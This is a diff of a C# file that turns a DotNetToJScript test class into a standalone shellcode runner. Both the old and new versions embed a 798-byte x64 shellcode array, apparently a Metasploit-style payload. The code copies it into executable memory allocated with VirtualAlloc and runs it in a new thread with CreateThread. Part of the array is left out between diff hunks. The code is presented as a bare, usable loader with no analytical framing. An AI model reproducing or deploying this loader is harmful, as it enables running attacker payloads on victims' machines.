@@ -1,41 +1,28 @@
-﻿//    This file is part of DotNetToJScript.
-//    Copyright (C) James Forshaw 2017
-//
-//    DotNetToJScript is free software: you can redistribute it and/or modify
-//    it under the terms of the GNU General Public License as published by
-//    the Free Software Foundation, either version 3 of the License, or
-//    (at your option) any later version.
-//
-//    DotNetToJScript is distributed in the hope that it will be useful,
-//    but WITHOUT ANY WARRANTY; without even the implied warranty of
-//    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-//    GNU General Public License for more details.
-//
-//    You should have received a copy of the GNU General Public License
-//    along with DotNetToJScript.  If not, see <http://www.gnu.org/licenses/>.
-
-using System;
+﻿using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
+using System.Threading.Tasks;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 
-[ComVisible(true)]
-public class TestClass
+namespace ClassLibrary1
 {
-    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-
-    [DllImport("kernel32.dll")]
-    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
-        IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-
-    [DllImport("kernel32.dll")]
-    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
-    public TestClass()
+    public class Class1
     {
-        byte[] buf = new byte[798] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
+            IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+        [DllImport("kernel32.dll")]
+        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
+        public static void runner()
+        {
+            byte[] buf = new byte[798] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
             0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,
             0x51,0x56,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
             0x8b,0x52,0x20,0x4d,0x31,0xc9,0x48,0x8b,0x72,0x50,0x48,0x0f,
@@ -104,20 +91,15 @@ public class TestClass
             0x00,0x59,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0x89,0xda,0xff,0xd5
             };
 
-        int size = buf.Length;
+            int size = buf.Length;
 
-        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
+            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
 
-        Marshal.Copy(buf, 0, addr, size);
+            Marshal.Copy(buf, 0, addr, size);
 
-        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
 
-        WaitForSingleObject(hThread, 0xFFFFFFFF);
-    }
-
-    public void RunProcess(string path)
-    {
-        Process.Start(path);
+            WaitForSingleObject(hThread, 0xFFFFFFFF);
+        }
     }
 }
-
